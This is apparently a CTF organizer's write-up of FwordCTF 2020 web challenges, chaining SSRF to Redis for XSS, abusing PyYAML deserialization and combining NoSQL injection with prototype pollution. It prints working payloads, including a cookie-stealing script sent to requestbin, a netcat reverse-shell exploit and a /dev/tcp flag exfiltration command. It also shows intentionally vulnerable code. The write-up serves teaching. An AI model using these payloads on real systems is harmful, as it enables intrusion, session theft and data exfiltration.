# FwordCTF 2020 Web+Bash writeups #

Our team Fword organized FwordCTF 2020 with more than 900 teams and 1900 participants , I've been in charge of managing the infrastructure and Web + Bash categories, we will discuss infrastructure stuffs in future articles and how to  deploy things as our platform got a maximum of 2mins down and tasks had 0 down time.

![STATS](https://i.imgur.com/Mw8OoKF.png)

However in this article we will discuss the possible ways of solving my Web / Bash tasks.

## PastaXSS (5 solves) 500pts ##

 ![TASK](https://imgur.com/F4BHxkK.png)
 
 This task was a symfony project and we were given the souce code (in fact all tasks had the source code attached to avoid any possible ways of guess).
 ### Enumeration ###
 
 When you visit the website we have a register/login page, after creating an account we can notice that we have the possibility to post a **jutsu** with markdown possibility.
 There is also a feature in the website that let us import a jutsu from a website, hmmm I smell some SSRF vector here. There is also a report admin page that only accepts 
 ``` http://web1.fword.wtf/jutsu/{id} ``` .
 
 ![HOME](https://imgur.com/XY4Rj5I.png)
 
 Markdown in jutsu:
 
 ![TASK](https://imgur.com/mUvo0j4.png)
 
 ## Exploitation ##
 
 Taking a look at the source code, you can notice in this part that the web page is using some caching , things began to be interesting here (SSRF+caching can lead to some juicy results)
 
 **JutsusController.php**
 
 ```php
 
 public function viewJutsu($id,EntityManagerInterface $em,CacheInterface $cache,MarkdownParserInterface $markdown){
        $repo=$em->getRepository(Jutsus::class);
        $jutsu=$repo->findOneBy(["id"=>$id]);
        $this->denyAccessUnlessGranted("SHOW",$jutsu);
        //fetch jutsu + htmlspecialchars+markdown
        $name=$jutsu->getName();
        $desc=htmlspecialchars($jutsu->getDescription());
        $description=$cache->get("jutsu".$jutsu->getId(),function()use($markdown,$desc){
            return $markdown->transformMarkdown($desc);
        });
        $publishedAt=$jutsu->getPublishedAt()->format('Y-m-d H:i:s');
        $author=$jutsu->getUser();
        return $this->render("jutsus/show.html.twig",["name"=>$name,"description"=>$description,"publishedAt"=>$publishedAt,"author"=>$author]);
}

 ```
 
 And this is the part where **curl** was used (a symfony service created) :
 
 ```php
 
 class Curl
{
    public function fetch(string $url):string {
        $response = shell_exec("curl '".escapeshellcmd($url)."' -s --max-time 6");
        preg_replace('/<title>(.*)<\/title>/i','',$response);
        return (!empty($response)?substr($response,0,780):"");

    }
    public function extractTitle(string $url):string{
        $response=$this->fetch($url);
        $output=array();
        preg_match('/<title>(.*)<\/title>/i',$response,$output);
        return (array_key_exists(1,$output) ? $output[1]:"Unknown Jutsu");

    }
}

```

So we can notice that if we can edit the cached version to have my XSS payload we will bypass htmlspecialchars sanitization and get our javascript code executed. We can achieve this if we chain 
the SSRF to communicate with Redis caching system ( you can know from the configuration files that the system is using redis with the hostname redis).
 
Using gopher protocol we can communicate with all text based protocols including redis by just following this pattern:
 
> gopher://redis:6379/_REDIS Command
 
we need to firstly fetch all keys using **KEYS \*** but you can notice the use of escapeshellcmd that will escape \* so we have to urlencode our payload in order to bypass this.
 
> gopher://redis:6379/_KEYS%20%2a
 
This will fetch all jutsus for us 
 
![RESULT](https://imgur.com/QZr5ljQ.png)

Now we only have to set that key to our XSS payload :

> gopher://redis:6379/_SET%20yLAP6wFwIy%3Ajutsu5598%20%27s%3A81%3A%22%3Cscript%20src%3D%22URL%22%3E%3C%2Fscript%3E%22%3B%27

And Bingo you will get the flag :

**FwordCTF{Y0u_Only_h4vE_T0_cH4in_4nd_Th1nk_w3ll}**

There was an unintended solution that exploited a problem in the markdown parser (I contacted the developer to resolve this issue)

``` ![<img src="#" onerror="src='http://requestbin.net/r/12bfihl1?c='+document.cookie; this.onerror=null"/>](#){onerror=outerHTML=alt} ```

## Useless(3 solves) 500pts ##

![TASK](https://imgur.com/r0HTsK7.png)

In this task we were given a flask project, when we open the website we can notice in the login page the possibility to login using github.After creating an account and signing in we don't see anything special.

![TASK](https://imgur.com/O60WJr5.png)

Let's get a look on the source code, after some digging, this part seems interesting, it's the logic handling the Github Oauth.

```python
@oauth_authorized.connect_via(github_authbp)
def github_oauth(github_authbp,token):
    if not github.authorized:
        return redirect(url_for("github.login"))
    resp = github.get("/user")
    if not resp.ok:
        return redirect(url_for("github.login"))
    info=resp.json()
    auth=oauth.OAuth.query.filter_by(provider_user_id=info["id"]).first()
    if auth is None:
        auth = oauth.OAuth(provider="github", provider_user_id=info["id"], token=token)
        if auth.user:
            login_user(auth.user)
            return redirect("/home",302)
        else:
            if not validate_username(info["login"]):
                return redirect("/register")
            if info["login"]=="fwordadmin":
                user = users.User(username=info["login"], email=info["email"],is_admin=True)
            else:
                user=users.User(username=info["login"],email=info["email"])
            auth.user=user
            base.db_session.add_all([user,auth])
            base.db_session.commit()
            login_user(user)
            return redirect("/home",302)
    else:
        login_user(auth.user)
        return redirect("/home", 302)

```

The meaning of this code (for lazy people :p ) when a user completes the Oauth dance successfully for the first time he will be registered in the database in the User table and we can also notice that **fwordadmin** is the github account of the admin (this information will help us next).

Now our goal is to login using fwordadmin account, there's something suspicious in the previous code, when you connect via github you don't need any password but indeed the user is still
saved in the same table where regular registrations are stored so we have to wonder what password is set by default or is there some column to verify the login method (which is not the case).

The User class confirms our statement, the default password is set to ""

```python
class User(UserMixin,Base):
    __tablename__ = 'users'
    id = Column(Integer, primary_key=True)
    username = Column(String(50), unique=True)
    email = Column(String(120), unique=True)
    password_hash=Column(String(200))
    is_admin=Column(Boolean)
    def __init__(self, username=None, email=None,password="",is_admin=False):
        self.username = username
        self.email = email
        print("pass :"+password)
        self.set_password(password)
        self.is_admin=is_admin

```

So if we connect with the following credentials we will takeover the admin account:

```
login: fwordadmin
password: //
```
There is a check that removes special characters so the password will be interpreted as "" at the end.

Now we have access to the admin panel that has a feature that parses docker-compose files (yaml file) so even without reading the source code we can know that is a yaml unsafe deserialization exploit.

The vulnerable code:

```python
def parse(text):
    try:
        res = yaml.load(text, Loader=Loader)
        return res
    except Exception:
        return "An Error has occured"

```

This is my final exploit that spawns a reverse shell:

```python
import yaml,subprocess,requests

class Payload(object):
        def __reduce__(self):
                return (subprocess.Popen,(tuple('nc IP PORT -e /bin/bash'.split(" ")),))
deserialized_data = yaml.dump(Payload())  
data1={"username":"fwordadmin","password":"////"}
print("[+] Payload is: "+deserialized_data)
#yaml.load(deserialized_data,Loader=yaml.Loader)
data2={"service":deserialized_data}
s=requests.Session()
r=s.post("https://useless.fword.wtf/login",data=data1)
if r.status_code==200:
        print("[+] Logged in successfully")
r=s.post("https://useless.fword.wtf/home",data=data2)
print("[+] Shell Spawned, check your listener)

```

I hope you had fun solving this task and learned from it , i tried to inspire it from a project in my internship .

## Otaku (8 solves) 500pts ##

![TASK](https://imgur.com/GduvVgP.png)

This was a Node Js application with its source code as always (i tried to use all known languages in the web tasks xd), opening the website we have a simple login/register page and a home page.

![TASK](https://imgur.com/4IZ3mAW.png)

Home Page:

![TASK](https://imgur.com/8y6Dccr.png)

We have an update feature after connecting to update our favorite anime and username, le's have a look at its source code:

```js
app.post("/update",(req,res)=>{
        try{
        if(req.session.username && req.session.anime){
                if(req.body.username && req.body.anime){
                        var query=JSON.parse(`{"$set":{"username":"${req.body.username}","anime":"${req.body.anime}"}}`);
                        client.connect((err)=>{
                                if (err) return res.render("update",{error:"An unknown error has occured"});
                                const db=client.db("kimetsu");
                                const collection=db.collection("users");
                                collection.findOne({"username":req.body.username},(err,result)=>{
                                        if (err) {return res.render("update",{error:"An unknown error has occured"});console.log(err);}
                                        if (result) return res.render("update",{error:"This username already exists, Please use another one"});});
                                collection.findOneAndUpdate({"username":req.session.username},query,{ returnOriginal: false },(err,result)=>{
                                        if (err) return res.render("update",{error:"An unknown error has occured"});
                                        var newUser={};
                                        var attrs=Object.keys(result.value);
                                        attrs.forEach((key)=>{
                                                newUser[key.trim()]=result.value[key];
                                                if(key.trim()==="isAdmin"){
                                                        newUser["isAdmin"]=0;
                                                }
                                        });
                                        req.session.username=newUser.username;
                                        req.session.anime=newUser.anime;
                                        req.session.isAdmin=newUser.isAdmin;
                                        req.session.save();
                                        return res.render("update",{error:"Updated Successfully"});
                                });
                        });

                }
                else return res.render("update",{error:"An unknown error has occured"});
        }
        else res.redirect(302,"/login");
}
catch(err){
        console.log(err);
}
});
```

We can easily notice the NoSQL injection in ```  var query=JSON.parse(`{"$set":{"username":"${req.body.username}","anime":"${req.body.anime}"}}`); ``` and prototype pollution here :

```
 var newUser={};
var attrs=Object.keys(result.value);
attrs.forEach((key)=>{
 newUser[key.trim()]=result.value[key];
if(key.trim()==="isAdmin"){
newUser["isAdmin"]=0;
  }
});
```

Our goal is to set isAdmin to 1, the prototype pollution vulnerable part is parsing the result json object of NoSQL query, so if we chain the NoSQL injection with prototype
pollution we will have the possibility to set isAdmin to 1, we can achieve this by injecting the following in anime field:

> brrr","   __proto__" : {"isAdmin":1}, "aaaa":"aaa

W don't have to forget the whitespace before ```__proto__``` because mongo doesn't accept it by default but we can notice the usage of trim() so adding some whitespace will do the trick.

Now we have admin access:

![ADMIN](https://imgur.com/kGcC3xI.png)

In the admin panel we have the possibility to set an environment variable and run a js script, the intended idea is to set ``` NODE_VERSION ``` env variable to some js code followed by // and then execute /proc/self/environ.
The content of /proc/self/environ will be interpreted as Js code ( we chose NODE_VERSION because it's the first env var, we knew it by connecting to the node docker image and checking its environment variables).

Final payload:

```
envname: NODE_VERSION

env: process.mainModule.require('child_process').exec("bash -c \" cat /flag.txt > /dev/tcp/IP/PORT\""); //

path: /proc/self/environ

```

And Bingo we got our flag 

![FLAG](https://imgur.com/DNO9m4H.png)

### Other Writeups ###

Super Guesser Team writeups, they solved all web challenges :D [LINK](https://github.com/Super-Guesser/ctf/tree/master/Fword%20CTF%202020/writeups)

Hexion Team Otaku task writeup [LINK](https://github.com/om3r-v/CTF-solutions/tree/master/FwordCTF/otaku)

## Bash Category ##

These category included some privesc and jail challenges , some really nice writeups were written by the teams that participated, so i'll put some links of the writeups:

**JailBoss:**

[Writeup 1](https://github.com/FrigidSec/CTFWriteups/tree/master/FwordCTF/Bash/JailBoss)

[Writeup 2](https://github.com/s-3ntinel/writeups/blob/master/ctf/FwordCTF_2020/bash/JailBoss/README.md)

**CapiCapi**

[Writeup 1](https://github.com/Zarkrosh/ctf-writeups/tree/master/2020-FwordCTF#bash---capicapi)

[Writeup 2](https://github.com/PeterPHacker/fword-ctf-writeups/blob/master/README.md)

**Bash is Fun**

[Writeup 1](https://github.com/s-3ntinel/writeups/blob/master/ctf/FwordCTF_2020/bash/BashIsFun/README.md)

[Writeup 2](https://github.com/Zarkrosh/ctf-writeups/tree/master/2020-FwordCTF#bash---bash-is-fun)

## Source Code ##

You can visit this github repo where i'll publish all related things to FwordCTF 2020 ( I have already published the tasks source code )

[FwordCTF 2020](https://github.com/kahla-sec/FwordCTF-2020)

Thank you for reading the entire article, if you have any questions you can contact me on twitter @belkahlaahmed1 . organizing this huge CTF was really a unique experience and I learned a lot from it. Long life Fword Team you are just awesome guys. 
